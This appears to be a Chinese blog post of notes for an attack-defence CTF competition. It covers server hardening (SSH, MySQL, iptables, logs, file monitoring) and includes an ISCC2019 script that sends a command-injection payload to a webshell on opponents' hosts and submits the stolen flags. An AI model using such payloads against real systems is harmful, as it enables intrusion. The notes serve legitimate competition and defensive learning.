---
title: "Awd Note"
date: 2019-06-18T08:48:13+08:00
draft: false
tags: ['awd','note']
categories: ['CTF笔记']
---

线下攻防赛笔记。

<!--more-->

从下面几个方面入手。

## 拿到服务器

先`passwd`命令修改用户密码，数据库密码，数据库中的网站账户密码

查看`/etc/passwd`下的后门用户，删除

备份`/var/www/html/`下的源码，d盾扫描后门

禁止修改文件夹内容`chattr -R +i /var/www/html`

看下最近的敏感操作

```
cat /root/.bash_history
```

看下最近登录的账户 `lastlog`

```
last -n 5|awk '{print $1}'
```

`ps aux` `ps -ef`查看诡异进程
查看已建立的网络连接及进程

```
netstat -antulp | grep EST
```

批量杀进程

```bash
kill `ps aux|grep 进程名|awk {'print $2'}`
```

查找24小时内修改的文件

```
find ./ -mtime 0 -name "*.php"
```

## ssh加固

`/etc/ssh/sshd_config`

修改ssh端口号

增加条目

```
AllowUsers root
AllowGroups root
DenyUsers	看情况
DenyGroups	看情况
```

```
/etc/hosts.allow
/etc/hosts.deny
# cat hosts.allow
sshd: 172.24.11. , 172.24.12.	//sshd只允许这两个ip段链接
```

**更改完需要重启ssh服务**

## MySQL加固


备份mysql数据库
```
mysqldump -u 用户名 -p 密码 数据库名 > bak.sql
mysqldump --all-databases > bak.sql
```

还原mysql数据库
```
mysql -u 用户名 -p 密码 数据库名 < bak.sql
```

**删除phpmyadmin**

更改MySQL root密码

方法1： 用SET PASSWORD命令

```bash
mysql -u root
mysql> SET PASSWORD FOR ['root'@'localhost'](mailto:'root'@'localhost') = PASSWORD('newpass');
```

方法2：用mysqladmin
```bash
mysqladmin -u root password "newpass"
```
如果root已经设置过密码，采用如下方法
```bash
mysqladmin -u root password oldpass "newpass"
```
方法3： 用UPDATE直接编辑user表
```bash
mysql -u root

mysql> use mysql;

mysql> UPDATE user SET Password = PASSWORD('newpass') WHERE user = 'root';

mysql> FLUSH PRIVILEGES;
```
在没有root密码的时候，可以这样
```
mysqld_safe --skip-grant-tables&

mysql -u root mysql

mysql> UPDATE user SET password=PASSWORD("new password") WHERE user='root';

mysql> FLUSH PRIVILEGES;
```

## 日志

日志路径

```
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/messages
lastlog
last
lastb
/var/log/maillog
/var/log/secure 
find / -name nginx.conf nginx的配置文件中有日志目录
access_log /var/log/nginx/access.log;
error_log /var/log/nginx/error.log;
tomcat的日志默认是存放在安装目录下的logs目录下
```

查看访问最多的前十个IP

```
cat /var/log/apache2/access.log |cut -d ' ' -f1|sort|uniq -c|sort -r|head -n 10
```
查看访问最多的前十个url
```
cat /var/log/apache2/access.log |cut -d ' ' -f7|sort|uniq -c|sort -r|head -n 10
```

## 文件监控

```bash
git clone https://github.com/seb-m/pyinotify.git
cd pyinotify/
python setup.py install
```

启动监控

```
python -m pyinotify /var/www/html/
```

## 网络监控

iptables操作

开放端口

```
#开放ssh
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
#打开80端口iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
#开启多端口简单用法
iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT
#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话
iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT
```

限制IP和访问速率

```
#单个IP的最大连接数为 30
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT
#单个IP在60秒内只允许最多新建15个连接
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT
#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）
iptables -A INPUT -p tcp --dport 80 -m limit --limit 2/s --limit-burst 10 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
```

放DDOS

```
iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT
```

`iptables-save` 保存

## 批量提交flag

下面是在iscc2019下线awd中用到的脚本

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests


def getflag(ip):
    # 批量获取shell
    url = "http://{}/8d20d57e2f2b9be5/fb30e70f7813489ddae79be07925a34a.php".format(ip)
    print(url)

    data = {
        'a': 'a=1);system(getflag',
    }
    res = requests.post(url, data, ).content
    print res[758:-1]
    if 'flag' in res:
        postflag(res[758:-1])


def postflag(flag):
    flag = flag.replace('\n','').replace('\t','').strip()
    headers = {
        'Cookie': 'MacaronSession=b54f71d79035ee55'
    }
    data = {
        'flag': flag
    }
    print flag
    r = requests.post('http://172.16.100.5:4000/sendconflictflag', data=data, headers=headers)
    print(r.content)

def getip():
    with open('ip.txt', 'r') as f:
        ips = [ip.strip('\n').replace('\t', '') for ip in f.readlines()]
        for ip in ips:
            # print(ip[0:3])
            try:

                if ip[0:3] == '119':
                    getflag(ip[1:])
                # if ip[:3] == '192':
                #     getflag(ip[1:])
            except:
                continue

if __name__ == '__main__':
    # for ip in range(1, 255):
    # getflag('192.168.{}.1'.format(ip))
    # getflag('127.0.0.1')
    getip()
```

## 其他的脚本

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author:Y4er
import logging
import random
import string
import paramiko

logger = logging.getLogger("Logger")
logger.setLevel(logging.DEBUG)
handler = logging.StreamHandler()
formatter = logging.Formatter(fmt='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y/%m/%d %H:%M:%S')
handler.setFormatter(formatter)
logger.addHandler(handler)


def randomStr(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def changeSSHPwd(host, username, newpasswd='root', port=22, timeout=5):
    '''
    更改ssh root密码并返回链接会话对象
    :param host: ip地址
    :param username: root
    :param newpasswd: 新密码
    :param port: 端口默认22
    :param timeout: 连接超时5s
    :return:
    '''
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, username, newpasswd, timeout=timeout)
        logger.info("{} 链接成功.".format(host))

        stdin, stdout, stderr = ssh.exec_command('id')
        logger.info("当前用户权限:%s" % stdout.read().strip('\n'))
        stdin, stdout, stderr = ssh.exec_command('echo {}:{}|chpasswd {}'.format(username, newpasswd, username))
        logger.warning('尝试更改{}密码为:{}.'.format(host, newpasswd))

    except Exception as e:
        logging.error("{} ssh connect fail.{}".format(host, e))
        exit(0)
    return ssh


def check(session):
    '''
    显示一些基本信息
    :param session: ssh会话
    :param rootpass: 原root密码
    :return:
    '''
    stdin, stdout, stderr = session.exec_command(
        '''sudo cat /etc/passwd|grep -v nologin|awk -F ":" {'print $1"|"$3"|"$4"|"$6'}''')
    logger.info("显示可疑用户\n" + stdout.read())

    stdin, stdout, stderr = session.exec_command('''last -n 10|awk '{print $1}' ''')
    logger.info("显示最近登录的10个用户\n" + stdout.read())

    stdin, stdout, stderr = session.exec_command(
        '''find / -iname "*upload*" |grep php ''')
    logger.info("可疑上传文件的脚本\n" + stdout.read())

    stdin, stdout, stderr = session.exec_command(
        '''netstat -natlp |sed '1,2d'|awk -F " " {'print $4"|"$5"|"$6'} ''')
    logger.info("所有开放的端口号\n本地主机|远程主机|状态\n" + stdout.read())

    stdin, stdout, stderr = session.exec_command(
        '''netstat -antulp | grep EST ''')
    logger.info("查看已建立的网络连接及进程\n" + stdout.read())

    stdin, stdout, stderr = session.exec_command(
        '''find / -mtime 0 -name "*.php" ''')
    logger.info("查找24小时内修改的文件\n" + stdout.read())


def bak(session, rootpass, newrootpass='root'):
    '''
    备份文件
    :param session:ssh会话
    :return:
    '''
    session.exec_command(
        '''sudo cp /etc/passwd /tmp/passwd && sudo cp /etc/shadow /tmp/shadow ''')
    logger.info("备份passwd和shadow到/tmp/")

    stdin, stdout, stderr = session.exec_command(
        '''mkdir /tmp/www/ && cp -R /var/www/html/ /tmp/www/ ''')
    logger.info("备份/var/www/html/到/tmp/www/")

    session.exec_command(
        '''mkdir /tmp/database/ && mysqldump -uroot -p{} --all-databases > /tmp/database/all.sql'''.format(rootpass))
    logger.info("备份MySQL数据库到/tmp/database/all.sql")

    session.exec_command('''find / -iname "phpinfo.php"|xargs rm -rf''')
    logger.warning("删除phpinfo.php")

    session.exec_command('''find / -type d -iname "*phpmyadmin*"|xargs rm -rf''')
    logger.warning("删除phpmyadmin")

    session.exec_command('''mysqladmin -u root -p{} password {}'''.format(rootpass, newrootpass))
    logger.warning("修改MySQL root账户密码为{}".format(newrootpass))
    session.exec_command('''service mysql restart''')


def defend(session, ip):
    '''
    加固措施
    :param session: ssh会话
    :param ip: 你的ip或c段
    :return:
    '''
    stdin, stdout, stderr = session.exec_command('''echo "sshd:{}" >> /etc/hosts.allow '''.format('ip'))
    logger.warning("添加{}到/etc/hosts.allow".format(ip))
    stdin, stdout, stderr = session.exec_command('''service ssh restart''')

    stdin, stdout, stderr = session.exec_command(
        '''mkdir -R /bin/zzrvtc/ && mv /bin/curl /bin/zzrvtc/curl && mv /bin/wget /bin/zzrvtc/wget && mv /bin/ls /bin/zzrvtc/ls && mv /bin/cd /bin/zzrvtc/cd&&mv /bin/ll /bin/zzrvtc/ll''')
    logger.warning("移动curl wget cd ls ll命令到/bin/zzrvtc/下 {}".format(stdout.read()))


if __name__ == '__main__':
    # 更改ssh密码为root
    session = changeSSHPwd('192.168.24.128', 'root', 'root')
    # check
    check(session)
    # 更改mysql密码为root
    bak(session, 'root')
    # 防御策略
    defend(session,'192.168.24.128/24')
```

```
批量给php文件引用waf.php
find . -type f -name "*.php"|xargs sed -i "s/<?php/<?php\nrequire_once('\/tmp\/waf.php');\n/g"
```

